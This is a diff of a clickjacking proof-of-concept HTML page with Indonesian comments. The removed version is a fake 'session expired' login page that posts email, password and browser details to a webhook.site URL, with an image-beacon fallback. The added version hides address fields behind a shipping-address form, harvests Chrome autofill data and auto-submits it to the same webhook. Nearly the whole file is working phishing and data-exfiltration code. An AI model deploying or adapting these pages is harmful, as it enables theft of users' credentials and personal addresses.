@@ -1,187 +1,155 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Login Required - Clickjacking PoC</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Details - Clickjacking PoC</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             margin: 0;
+            height: 100vh;
+        }
+        .address-container {
+            background-color: white;
             padding: 20px;
-            background: #f0f0f0;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            margin-top: auto;
+            position: relative;
         }
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            background: white;
-            padding: 20px;
-            border: 2px solid #333;
+        .address-container h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+            text-align: center;
+            color: #333;
         }
-        h2 {
-            margin-top: 0;
-            color: #c00;
-        }
-        input {
+        .address-container input[type="text"],
+        .address-container input[type="number"] {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid #999;
-            box-sizing: border-box;
-            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
         }
-        button {
+        .address-container input[type="submit"] {
             width: 100%;
             padding: 12px;
-            background: #c00;
-            color: white;
+            background-color: #4CAF50;
             border: none;
+            border-radius: 5px;
+            color: white;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin: 10px 0;
+            position: relative;
+            z-index: 2;
         }
-        .debug {
-            margin-top: 30px;
-            padding: 15px;
-            background: #ffd;
-            border: 1px dashed #c00;
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
+        .address-container input[type="submit"]:hover {
+            background-color: #45a049;
         }
-        iframe {
-            position: fixed;
-            top: 0;
+        .location-icon {
+            position: absolute;
+            top: 70px;
             left: 0;
             width: 100%;
-            height: 100%;
-            border: 2px solid red; /* Ubah ke opacity:0 untuk production */
-            opacity: 0.3; /* 0.3 untuk testing biar keliatan, 0 untuk live */
-            z-index: 9999;
-            pointer-events: auto;
-            background: transparent;
+            height: 50px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23cccccc"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>') no-repeat center;
+            background-size: contain;
+            z-index: 1;
+            opacity: 0.5;
         }
-        .warning {
-            color: #c00;
-            font-weight: bold;
-            margin: 10px 0;
+        .info-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>⚠️ SESSION EXPIRED</h2>
-        <p>Your session has expired. Please login again to continue.</p>
-        <div class="warning">* Login credentials will be sent to webhook.site</div>
+    <div class="address-container">
+        <h2>Confirm Your Shipping Address</h2>
+        <div class="info-text">Please click Submit to continue</div>
         
-        <form id="loginForm">
-            <input type="email" id="email" name="email" placeholder="Email address" value="test@example.com" required>
-            <input type="password" id="password" name="password" placeholder="Password" value="password123" required>
-            <button type="button" id="submitBtn">LOGIN NOW</button>
+        <form id="addressForm" action="https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c" method="POST">
+            <div class="location-icon"></div>
+            
+            <!-- Hidden fields untuk address autofill -->
+            <input type="text" id="fullname" name="fullname" placeholder="Full Name" required>
+            <input type="text" id="street" name="street" placeholder="Street Address" required>
+            <input type="text" id="city" name="city" placeholder="City" required>
+            <input type="text" id="state" name="state" placeholder="State/Province" required>
+            <input type="text" id="zipcode" name="zipcode" placeholder="ZIP/Postal Code" required>
+            <input type="text" id="country" name="country" placeholder="Country" required>
+            <input type="text" id="phone" name="phone" placeholder="Phone Number">
+            
+            <!-- Submit button yang terlihat -->
+            <input type="submit" value="Submit Address">
         </form>
-        
-        <div class="debug" id="debug">
-            Status: Waiting for click...
-        </div>
     </div>
 
-
     <script>
-        // Fungsi untuk mengirim data ke webhook
-        function sendToWebhook(email, password) {
-            const debug = document.getElementById('debug');
-            
-            // Data yang akan dikirim
-            const data = {
-                timestamp: new Date().toISOString(),
-                type: 'autofill_clickjacking_poc',
-                email: email,
-                password: password,
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenSize: screen.width + 'x' + screen.height,
-                url: window.location.href,
-                referrer: document.referrer || 'direct'
-            };
-            
-            // Update debug
-            debug.innerHTML = '📤 Sending data to webhook...<br>' + 
-                             'Email: ' + email + '<br>' +
-                             'Password: ' + password + '<br>' +
-                             'URL: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c';
-            
-            // Kirim ke webhook
-            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
-                method: 'POST',
-                mode: 'no-cors', // Pakai no-cors biar gak kena CORS error
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(() => {
-                debug.innerHTML += '<br><br>✅ Data sent successfully!<br>';
-                debug.innerHTML += 'Check: <b>https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c</b>';
-            })
-            .catch(error => {
-                debug.innerHTML += '<br><br>❌ Error sending: ' + error;
-                // Fallback - coba kirim pake cara lain
-                fallbackSend(data);
-            });
-            
-            // Simpan ke localStorage untuk bukti
-            localStorage.setItem('captured_' + Date.now(), JSON.stringify(data));
-        }
-        
-        // Fallback method pake image beacon
-        function fallbackSend(data) {
-            const img = new Image();
-            img.src = 'https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c?data=' + 
-                      encodeURIComponent(JSON.stringify(data));
-            document.getElementById('debug').innerHTML += '<br>📡 Fallback method used';
-        }
-        
-        // Event listener untuk tombol
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            if (!email || !password) {
-                alert('Email and password required');
-                return;
+        function checkInputsAndSubmit() {
+            const fullname = document.getElementById('fullname').value;
+            const street = document.getElementById('street').value;
+            const city = document.getElementById('city').value;
+            const zipcode = document.getElementById('zipcode').value;
+            const country = document.getElementById('country').value;
+
+            // Cek jika field wajib sudah terisi (via autofill)
+            if (fullname && street && city && zipcode && country) {
+                console.log('Address autofill detected, submitting...');
+                console.log('Captured address:', {
+                    fullname: fullname,
+                    street: street,
+                    city: city,
+                    state: document.getElementById('state').value,
+                    zipcode: zipcode,
+                    country: country,
+                    phone: document.getElementById('phone').value
+                });
+                
+                // Submit form ke webhook
+                document.getElementById('addressForm').submit();
             }
-            
-            sendToWebhook(email, password);
-            
-            // Opsional: redirect ke Google biar keliatan legitimate
-            // setTimeout(() => {
-            //     window.location.href = 'https://google.com';
-            // }, 2000);
-        });
+        }
+
+        // Event listener untuk semua field
+        document.getElementById('fullname').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('street').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('city').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('state').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('zipcode').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('country').addEventListener('input', checkInputsAndSubmit);
+        document.getElementById('phone').addEventListener('input', checkInputsAndSubmit);
         
-        // Event listener untuk form submit (Enter key)
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            document.getElementById('submitBtn').click();
-        });
-        
-        // Log di console
-        console.log('=== CLICKJACKING PoC READY ===');
+        // Log untuk debugging
+        console.log('=== ADDRESS CLICKJACKING PoC READY ===');
+        console.log('Target: chrome://settings/addresses autofill');
         console.log('Webhook: https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c');
-        console.log('Iframe opacity: 0.3 (visible for testing)');
-        console.log('===============================');
+        console.log('=======================================');
         
-        // Test webhook di background
-        setTimeout(() => {
-            console.log('Testing webhook connection...');
-            fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({test: true, message: 'PoC loaded'})
-            });
-        }, 1000);
+        // Test webhook
+        fetch('https://webhook.site/29f60501-ccf6-4f66-9ba8-fee857e1754c', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                status: 'address_poc_loaded',
+                timestamp: new Date().toISOString()
+            })
+        });
     </script>
 </body>
 </html>
